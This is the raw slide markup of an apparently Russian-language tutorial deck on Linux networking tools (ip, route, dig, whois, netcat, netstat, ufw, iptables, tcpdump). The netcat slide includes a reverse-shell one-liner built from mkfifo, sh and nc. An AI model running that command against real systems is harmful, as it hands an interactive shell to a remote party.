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habr.com/ru/post/320428/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://habr.com/ru/post/131433/" TargetMode="Externa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2"/>
              </a:rPr>
              <a:t>https://habr.com/ru/post/320428/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https://habr.com/ru/post/131433/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https://habr.com/ru/company/first/blog/335428/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ip6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типы dns записей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ccd17e3f64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ccd17e3f6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b89b3377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b89b3377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b89b33774e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b89b33774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b89b3377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b89b3377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b89b33774e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b89b33774e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ca5d658e7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ca5d658e7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360991771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360991771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ca5d658e73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ca5d658e73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591dc78755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591dc78755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ca5d658e73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ca5d658e73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ca5d658e73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ca5d658e73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b8b7630b2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b8b7630b2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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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https://habr.com/ru/company/vdsina/blog/562110/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ca5d658e7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ca5d658e7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https://habr.com/ru/company/first/blog/335428/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hyperlink" Target="https://wizardzines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Сеть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ip</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;61;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2082600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$ ip --help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Usage: ip [ OPTIONS ] OBJECT { COMMAND | help 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ip [ -force ] -batch filename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where  OBJECT := { link | address | addrlabel | route | rule | neigh | ntable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tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm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netns | l2tp | fou | macsec | tcp_metrics | token | netconf | ila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vrf | sr | nexthop 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OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve]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-h[uman-readable] | -iec | -j[son] | -p[retty]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-f[amily] { inet | inet6 | mpls | bridge | link }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-4 | -6 | -I | -D | -M | -B | -0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-l[oops] { maximum-addr-flush-attempts } | -br[ief]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-o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename]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-rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |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Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>                    -c[olor]}</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="12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19575" y="0"/>
            <a:ext cx="3312726" cy="2399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Примеры использования (ip a)</a:t>
            </a:r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311700" y="572700"/>
            <a:ext cx="8520600" cy="323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Назначение IP-адреса интерфейсу eth0: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ip a add 192.168.1.200/24 dev eth0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Включить сетевой интерфейс eth0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ip link set eth0 up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Настроить сетевой интерфейс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ip link set eth0 mtu 9000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Сменить MAC-адрес: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sudo ip link set dev eth0 address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BC:AE:C5:BE:8B:B7</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Google Shape;69;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="3931775"/>
            <a:ext cx="8520600" cy="985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4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 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link/ether 02:42:d2:89:e1:b7 brd ff:ff:ff:ff:ff:ff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inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0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       valid_lft forever preferred_lft forever</a:t>
            </a:r>
            <a:endParaRPr sz="13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Маршрутизация (route)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Google Shape;75;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="8520600" cy="166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root@TyVik-XPS:~# route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Kernel IP routing table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Destination   Gateway   Genmask        Flags Metric Ref  Use Iface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default       _gateway  0.0.0.0        UG    600    0      0 wlp59s0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link-local    0.0.0.0   255.255.0.0    U     1000   0      0 wlp59s0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192.168.1.0   0.0.0.0   255.255.255.0  U     600    0      0 wlp59s0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6" name="Google Shape;76;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311750" y="2599875"/>
            <a:ext cx="8520600" cy="21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 Добавление маршрута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дефолтного: route add default gw 192.168.1.1 eth0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через шлюз: route add -net 192.168.0.0/16 gw 10.0.0.1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через интерфейс: route add -net 192.168.0.0/16 dev eth1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до отдельного хоста: route add -host 192.168.0.1 gw 172.16.0.1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Удаление маршрута: route del ...</a:t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/etc/resolv.conf</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Google Shape;82;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="8520600" cy="1015800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CFE2F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$ cat /etc/resolv.conf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# resolv.conf autogenerated by /opt/ivpn/etc/client.up (tun0)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nameserver 10.34.44.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Google Shape;83;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1727900"/>
            <a:ext cx="4358700" cy="16008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/>
              <a:t>resolvectl:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="20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query &lt;domain&gt; - узнать IP адрес домена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status - конфигурация DNS для интерфейсов</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Google Shape;84;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5241600" y="1588500"/>
            <a:ext cx="3590700" cy="3140100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCE5CD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Link 2 (wlp59s0)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Current Scopes: DNS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DefaultRoute setting: yes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LLMNR setting: yes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MulticastDNS setting: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DNSOverTLS setting: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DNSSEC setting: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DNSSEC supported: no     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Current DNS Server: 192.168.1.1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DNS Servers: 192.168.1.1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                           8.8.8.8    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    DNS Domain: ~.</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Google Shape;85;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="3414500"/>
            <a:ext cx="4358700" cy="1569900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D0E0E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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>nslookup tyvik.ru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$ cat /etc/hosts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127.0.0.1	localhost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127.0.0.1	ya.ru </a:t>
            </a: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</a:t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244175" y="572700"/>
            <a:ext cx="8520600" cy="461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990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t># dig geopuzzle.org @8.8.8.8 A</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="99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 &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; geopuzzle.org @8.8.8.8 A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global options: +cmd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Got answer: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-&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38487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;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="B45F0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;; QUESTION SECTION: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38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;geopuzzle.org.			IN	A</a:t>
            </a:r>
            <a:endParaRPr sz="16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;; ANSWER SECTION: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0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>geopuzzle.org.		2568	IN	A	67.207.79.140</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="0B5394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Query time: 48 msec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SERVER: 8.8.8.8#53(8.8.8.8)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WHEN: Thu Mar 25 21:07:54 MSK 2021</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="741B4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741B47"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; MSG SIZE  rcvd: 58</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="741B47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whois</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="244175" y="572700"/>
            <a:ext cx="8520600" cy="387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$ whois ya.ru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domain:        YA.RU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nserver:       ns1.yandex.ru.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nserver:       ns2.yandex.ru.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state:         REGISTERED, DELEGATED, VERIFIED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org:           YANDEX, LLC.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registrar:     RU-CENTER-RU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admin-contact: https://www.nic.ru/whois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created:       1999-07-12T14:40:22Z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paid-till:     2021-07-31T21:00:00Z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free-date:     2021-09-01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source:        TCI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latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Last updated on 2021-03-28T14:31:30Z</a:t>
            </a:r>
            <a:endParaRPr sz="1600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64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DNS-записи</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="103" name="Google Shape;103;p20" title="Screenshot from 2025-05-16 21-51-1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5851" y="691575"/>
            <a:ext cx="7312294" cy="4451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telnet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Google Shape;109;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="572700"/>
            <a:ext cx="85206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$ telnet ya.ru 80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Trying 87.250.250.242...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Connected to ya.ru.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Escape character is '^]'.</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="Google Shape;110;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="2571750"/>
            <a:ext cx="8520600" cy="24012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^]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telnet&gt; help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Commands may be abbreviated.  Commands are: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close   	close current connection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logout  	forcibly logout remote user and close the connection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display 	display operating parameters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...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netcat</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Google Shape;116;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="57270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Открывает соединение на порт 4444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$ nc -lvp 4444</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Google Shape;117;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179225" y="3087300"/>
            <a:ext cx="85206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Архивирование и отправка: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 tar -czf - /path/to/ | pv -b | nc -l 4444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# Получение архива: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/>
              <a:t>nc servername 4444 | pv -b &gt; file.tar.gz</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Google Shape;118;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="235500" y="1745875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Реверс-прокси:</a:t>
            </a:r>
            <a:endParaRPr sz="20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</a:rPr>
              <a:t>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 0.0.0.0 8080 &gt;/tmp/f</a:t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netstat</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700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# netstat -tlpn | grep LISTEN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localhost:6379  0.0.0.0:* LISTEN 1685/redis-server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localhost:53    0.0.0.0:* LISTEN 1205/systemd-resolv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localhost:631   0.0.0.0:* LISTEN 1324/cupsd     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localhost:41655 0.0.0.0:* LISTEN 1512/containerd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urier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>tcp 0 0 localhost:5432  0.0.0.0:* LISTEN 1723/postgres       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25" name="Google Shape;125;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2571750"/>
            <a:ext cx="8658600" cy="2339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#</a:t>
            </a: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 netstat -atp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Active Internet connections (servers and established)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Proto Local Address    Foreign Address         State       PID/Program name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localhost:6379   0.0.0.0:*               LISTEN      1685/redis-server 1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localhost:5432   0.0.0.0:*               LISTEN      1723/postgres   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TyVik-XPS:42952  149.154.167.51:https    ESTABLISHED 22797/Telegram    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TyVik-XPS:45920  172.65.251.78:https     ESTABLISHED 1493/gitlab-runner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TyVik-XPS:46178  lg-in-f139.1e100.:https ESTABLISHED 9207/chrome --type=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TyVik-XPS:35152  ec2-3-122-154-62.:https ESTABLISHED 56742/slack --type=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Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>tcp   TyVik-XPS:43906  149.154.167.51:https    ESTABLISHED 22797/Telegram  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Настройки ядра</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Google Shape;131;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="877500"/>
            <a:ext cx="85206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 echo "1" &gt; /proc/sys/net/ipv4/ip_forward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/>
              <a:t># sysctl net.ipv4.ip_forward=1</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Google Shape;132;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2570925"/>
            <a:ext cx="8520600" cy="184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kernel.hostname - задать имя хоста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/>
              <a:t>net.ipv4.icmp_echo_ignore_all - запретить ответ на ping (защита от DDoS)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net.ipv4.ip_default_ttl - время жизни пакета по умолчанию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net.ipv4.ip_forward - разрешить транзитные пакеты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net.ipv4.tcp_keepalive_time - время жизни соединения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 sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>net.core.rmem_max - максимальный размер буфера для чтения по сети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Фаервол (ufw, iptables)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="85206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Значения по умолчанию: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ufw default deny incoming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default allow outgoing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Добавление правил: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allow 22 80 443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# ufw allow from 192.168.1.2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from 192.168.1.0/24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from 192.168.1.2 to any port 22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allow in on eth0 to any port 80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Удаление правил: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status numbered</a:t>
            </a:r>
            <a:endParaRPr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# ufw delete 2</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="328950" y="4259650"/>
            <a:ext cx="8486100" cy="615600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A4C2F4"/>
          </a:solidFill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#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> iptables -A OUTPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT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# iptables -A INPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT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w3m</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="145" name="Google Shape;14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2738" y="572700"/>
            <a:ext cx="7658525" cy="426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7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tcpdump</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="88323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/>
              <a:t># tcpdump -n -i any port 53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21:27:10.869311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127.0.0.1.34746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127.0.0.53.53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35935+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> [1au] A? tyvik.ru. (49)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21:27:10.869696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192.168.1.47.47953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192.168.1.1.53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43715+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> A? tyvik.ru. (26)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rgbClr val="B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>21:27:10.913465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192.168.1.1.53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192.168.1.47.47953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43715</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> 2/0/0 A 104.21.14.168 (58)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B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>21:27:10.913790</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.53.53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1.34746</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35935</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> 2/0/1 A 104.21.14.168 (69)</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2341025"/>
            <a:ext cx="49782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Записать дамп в файл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tcpdump -i any -w packets.pcap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Посмотреть что приходит на 8000 порту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# tcpdump -A dst port 8000</a:t>
            </a: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8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wireshark</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="158" name="Google Shape;15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6338" y="572700"/>
            <a:ext cx="8111326" cy="44926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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="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Диагностика</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="8520600" cy="264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Сетевой интерфейс поднят (ip, ifconfig)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Маршрут для сети существует (route)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DNS запросы расшифровываются (resolvectl, dig)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Порты открываются (netstat, nc)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Сервер доступен (ping, traceroute, telnet)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Фаервол настроен (ufw)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Сетевые пакеты не бьются (tcpdump)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en" sz="2000"/>
              <a:t>Полезная нагрузка прилетает в правильном виде (wireshark)</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3173900" y="4592000"/>
            <a:ext cx="21273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https://wizardzines.com/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